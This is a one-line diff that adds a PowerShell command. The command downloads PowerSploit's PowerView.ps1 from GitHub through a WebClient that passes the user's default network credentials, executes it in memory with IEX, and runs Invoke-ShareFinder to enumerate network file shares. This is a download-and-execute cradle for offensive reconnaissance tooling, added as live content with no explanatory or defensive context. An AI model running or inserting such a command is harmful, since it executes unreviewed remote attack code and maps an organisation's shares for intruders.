@@ -1,0 +1,1 @@
+$browser=New-Object System.Net.WebClient; $browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX($browser.DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1"));Invoke-ShareFinder
